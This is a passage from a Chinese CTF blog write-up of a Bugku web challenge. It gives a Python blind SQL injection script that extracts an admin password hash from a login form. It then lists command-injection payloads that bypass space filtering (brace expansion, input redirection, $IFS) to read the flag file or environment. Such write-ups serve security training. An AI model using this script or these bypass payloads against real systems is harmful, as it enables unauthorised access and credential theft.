+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:10945&#x2F;login.php&#39;</span><br><span class="line">mima&#x3D;&#39;&#39;</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  for j in range(48,123):</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">      &#39;uname&#39;:f&quot;admin&#39;^(ascii(substr((passwd)from(&#123;i&#125;)))&#x3D;&#123;j&#125;)^&#39;&quot;,</span><br><span class="line">      &#39;passwd&#39;:&#39;123&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    resp&#x3D;r.post(url,data&#x3D;data).text</span><br><span class="line">    if &#39;username&#39; in resp:</span><br><span class="line">      print(f&quot;第&#123;i&#125;个：&#123;chr(j)&#125;&quot;)</span><br><span class="line">      mima+&#x3D;chr(j)</span><br><span class="line">print(mima)</span><br></pre></td></tr></table></figure>
+<p>得到32位密文后，放入somd5解密，得到密码bugkuctf，利用账号admin和密码bugku登录后，进入新的页面，该页面具有系统命令执行功能，但过滤部分字符串，获得flag的payload有很多，下面列举几个并作说明：</p>
+<ul>
+<li>env :用于输出系统环境变量，这道题中系统环境变量中有flag；</li>
+<li>{echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量</li>
+<li>{cat,/flag}：绕过空格限制，读取根目录下flag文件；</li>
+<li>cat&lt;/flag：绕过空格限制，</li>
+<li>cat&lt;&gt;/flag：绕过空格限制；</li>
+<li>a=$‘\x20/flag’&amp;&amp;cat$a：\x20转换为字符串就是空格;</li>
+</ul>
+</li>
+</ul>
+<p>还有两个绕过空格的方法，但是本题中给过滤掉了：</p>
+<ul>
+<li>cat${IFS}/flag </li>
+<li>cat$IFS$9/flag</li>
+</ul>
+<p>通过以上即可得到flag{a76e888fdf053f9d20a76eab8dcf1a99}</p>
+<hr>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>**tip: **</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210127002332.png" alt="20210127002332"></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAAD+klEQVR42u3aS27bQBAFQN//0gngVQCH5HvdQycGiivBooYzJQOt/nx8xNevz+vP11+vr/ff33N15/09+VOuVjtw4cCBAweO4KjJ0smdV4gJdMJ0T3N1T7FzHDhw4MBxiGMfXGfHuw+o+R4Sjmi3OHDgwIHjGznyfGcT/PIjbd7FgQMHDhz/J8ep8JxU6jbJIQ4cOHDg+H6OtoWTvLtpOLXlyE1xEwcOHDhwnOWYhc+f9fr1+Q4cOHDgwBEHs6Tkd58U5cFvFmjbwYvL1XDgwIEDx5oj2W47snC2yLgpKc7Kjjhw4MCB4w2O/ACb+/MDJ82nHO7hUzhw4MCB4xBHG5b2iVkL2qZ5w8CMAwcOHDgWHPnAwWaIIQmTbaNr32F7qJXiwIEDB45FtW1fsJsdtR1oa5+ef504cODAgeMUR5L8vJdibdpdedJYNMZw4MCBA8eaY1YKzMcUWoJ90phTFsVEHDhw4MARc7Rtof2VHGw/+pAUJaOyIA4cOHDgGHG0baE8KCZr3v9lNqyQ7woHDhw4cJzlmAWkVY8r3nRe+NvQP/yP4MCBAweOEUcygnaqLJiPOCQBMv9LHbxx4MCBA8eIoy2l5Q2qTdupDaKzhO2hVooDBw4cOEYc0aBYPPSQv5uvnLes2rNc3okDBw4cOA5xtMXB2UhcNFgQf1V58C6+Nhw4cODA8TLHpi00a03N2kj5sx52jgMHDhw4FhyzQNXy5WFykwrOBjIOxG0cOHDgwLEuq7XNp9n6s1Rwsz4OHDhw4Nhz7EcH2rm8NmS26dxsThAHDhw4cJzlmAWztniXt7KSVlNbmiwSThw4cODAsea4P/CpQbpZwJ5hzcI5Dhw4cODYcyQjCHuaWYDc497zPbSdcODAgQPHgiNJ29o0bzYA0RYTkx3mA3M4cODAgeMsx/4A+f2nKNu08GHnOHDgwIHjKEcewHKIU8lYnpIlPwgeioM4cODAgeMQR5Hq3JfYRsMNs/A8HIa7WhkHDhw4cBziaF/nAWw27tCOKcwKlw9dOBw4cODAseDIGzbtUZNRgzrRir/O+ydGKRwOHDhw4BhxtAfbjzu0Bz7V3Ho4Fw4cOHDgWHNsinR5g2d2teu3d9YL4cCBAweOgGMzsrAPk5tkrx2nixJFHDhw4MCx5mjD3tnA1pb2kh8BSfPswA8FHDhw4MARlAjzoDg7QPupPDxvmk91IocDBw4cOGKONj07FsPjr2czGHGgF4cDBw4cOF7gaEtyszCcr7kZerh8Ig4cOHDg+EccbQEuLzXmIXOYpN1nbThw4MCB4xDHPnHaBLw8rM5GJYrwjwMHDhw41hxtKGqPkbeX2hC+2fmqlIkDBw4cOP7+3N+MWz9xaHCuIAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/01/28/vps+frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            vps+frp实现内网穿透
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/01/16/2021-01-21(%E5%AD%A6%E6%9C%9F%E6%80%BB%E7%BB%93)/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">2021.01.16(学期总结)</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ds54farWshFsUraKxWRVVf4G-gzGzoHsz",
+    app_key: "q4rgias5HDeq09ugweytekJQ",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2018-2023
+        <i class="ri-heart-fill heart_icon"></i> Supervampire
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/#/Integrated/recordQuery" target="_black" rel="nofollow">苏ICP备2022035104号-1</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/ayer-side.svg" alt="の"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://wxt123.top/downloads/">云盘</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222926.png">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222736.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
